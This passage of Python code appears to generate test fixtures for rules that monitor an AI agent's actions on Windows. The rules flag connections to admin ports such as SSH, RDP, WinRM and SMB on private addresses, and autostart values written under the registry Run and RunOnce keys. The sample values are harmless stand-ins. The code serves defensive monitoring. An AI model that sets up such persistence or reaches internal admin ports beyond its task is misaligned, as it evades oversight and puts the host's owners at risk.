s.call("Edit", {"path": "C:\\proj\\Startup\\run.cmd"}); s.command("ls")
write(R + "PERSIST-AUTOSTART/negative-hooks.json", s.lines)
# NET-ADMIN-PORT: PowerShell's own socket to 22 of a private address (the measured case), an ssh not started by git,
# and the other ports and private ranges of the rule in IPv4 and IPv6.
os_doc(R + "NET-ADMIN-PORT/positive-admin-ports.json", os_export(75201, 4950, [
    ("proc", "02.000", 4960, CMD_EXE, 4950, OS.AGENT), ("proc", "02.100", 4970, PWSH, 4960, CMD_EXE),
    ("net", "02.500", 4970, PWSH, "192.168.1.20", 22),
    ("proc", "03.000", 4980, OS_SSH, 4950, OS.AGENT), ("net", "03.200", 4980, OS_SSH, "10.0.0.5", 22),
    ("net", "04.000", 4950, OS.AGENT, "172.16.4.8", 3389), ("net", "04.100", 4950, OS.AGENT, "100.64.0.9", 5985),
    ("net", "04.200", 4970, PWSH, "fd00::25", 445), ("net", "04.300", 4970, PWSH, "::ffff:192.168.1.21", 5986)]),
    4950, cite=lambda r: r["tool"] == "net")
# Not this rule's: loopback, link-local (IPv4, IPv6) and public 22, private 443, a connection accepted on 22 (the
# listener's own port), an ssh started by git, a 22 whose Initiated is not read.
os_doc(R + "NET-ADMIN-PORT/negative-not-admin.json", os_export(75301, 4951, [
    ("proc", "02.000", 4961, PWSH, 4951, OS.AGENT),
    ("net", "02.100", 4961, PWSH, "127.0.0.1", 22), ("net", "02.200", 4961, PWSH, "169.254.10.20", 22),
    ("net", "02.300", 4961, PWSH, "fe80::1", 22), ("net", "02.400", 4961, PWSH, "203.0.113.7", 22),
    ("net", "02.500", 4961, PWSH, "192.168.1.20", 443), ("net", "02.600", 4961, PWSH, "192.168.1.20", 22, "false"),
    ("net", "02.700", 4961, PWSH, "192.168.1.20", 22, "-"),
    ("proc", "03.000", 4971, OS.GIT, 4951, OS.AGENT), ("proc", "03.100", 4981, OS.GIT_SSH, 4971, OS.GIT),
    ("net", "03.200", 4981, OS.GIT_SSH, "10.0.0.5", 22)]), 4951)
# A net line written before M15.1 (no initiated, dest_scope, image, parent_image): not judged (partial), never fired.
os_doc(R + "NET-ADMIN-PORT/negative-before-the-keys.json", os_export(75401, 4952, [
    ("proc", "02.000", 4962, PWSH, 4952, OS.AGENT), ("net", "02.100", 4962, PWSH, "192.168.1.20", 22)]), 4952,
    strip=("initiated", "dest_scope", "image", "parent_image"))
# M15.2 (ADR-0014 Amendment B, AB-1, AB-2): PERSIST-RUN-KEY. Its os lines are os-sysmon's own (os_sysmon.build) of
# SYNTHETIC exports holding events 13 in the four measured shapes of TargetObject and the two they imply (a made-up
# SID, made-up value names, harmless value text only).
REG_EXE = "C:\\Windows\\System32\\reg.exe"
SID = "S-1-5-21-1111111111-2222222222-3333333333-1001"
USER_RUN = "HKU\\" + SID + "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\"
MACHINE_RUN = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\"
MACHINE_32 = "HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\"
os_doc(R + "PERSIST-RUN-KEY/positive-run-values.json", os_export(75501, 4990, [
    ("proc", "02.000", 4991, CMD_EXE, 4990, OS.AGENT), ("proc", "02.100", 4992, REG_EXE, 4991, CMD_EXE),
    ("reg", "02.200", 4992, REG_EXE, USER_RUN + "Run\\RaqibTestA", "cmd /c echo test"),
    ("proc", "02.300", 4993, PWSH, 4990, OS.AGENT),
    ("reg", "02.400", 4993, PWSH, USER_RUN + "RunOnce\\RaqibTestB", '"C:\\Program Files\\Example\\tool.exe" --start'),
    ("reg", "02.500", 4993, PWSH, MACHINE_RUN + "Run\\RaqibTestC", "C:\\Windows\\System32\\notepad.exe"),
    ("reg", "02.600", 4993, PWSH, MACHINE_32 + "Run\\RaqibTestD", "cmd /c echo test"),
    ("reg", "02.700", 4990, OS.AGENT, MACHINE_RUN + "RunOnce\\RaqibTestE", "cmd /c echo test"),
    ("reg", "02.800", 4990, OS.AGENT, MACHINE_32.lower() + "RUNONCE\\RaqibTestF", "cmd /c echo test"),
    ("reg", "02.900", 4992, REG_EXE, USER_RUN + "Run\\RaqibTestG", "Binary Data")]), 4990,
    cite=lambda r: r["tool"] == "registry")
# Not this rule's: a registry line whose autostart is null (os-sysmon writes none: made by hand), a file whose path
# holds CurrentVersion\Run, a process line of reg.exe; the RunNotification value Windows' own sihost sets is no line.
def _no_autostart(r):
    if r["tool"] == "registry":
        r["input_meta"]["autostart"] = None
os_doc(R + "PERSIST-RUN-KEY/negative-not-a-run-value.json", os_export(75601, 4995, [
    ("proc", "02.000", 4996, REG_EXE, 4995, OS.AGENT),
    ("reg", "02.100", 4996, REG_EXE, USER_RUN + "Run\\RaqibTestA", "cmd /c echo test"),
    ("reg", "02.200", 4996, REG_EXE, USER_RUN + "RunNotification\\RaqibTestN", "DWORD (0x00000003)"),
    ("file", "02.300", 4995, OS.AGENT, "C:\\Users\\user\\AppData\\Local\\Temp\\CurrentVersion\\Run\\notes.txt")]),
    4995, edit=_no_autostart)
# A registry line with no autostart key at all (not a line os-sysmon writes): not judged (partial, said), never fired.
os_doc(R + "PERSIST-RUN-KEY/negative-autostart-absent.json", os_export(75701, 4997, [
    ("reg", "02.100", 4997, OS.AGENT, USER_RUN + "Run\\RaqibTestA", "cmd /c echo test")]), 4997,
    edit=lambda r: r["input_meta"].pop("autostart") if r["tool"] == "registry" else None)
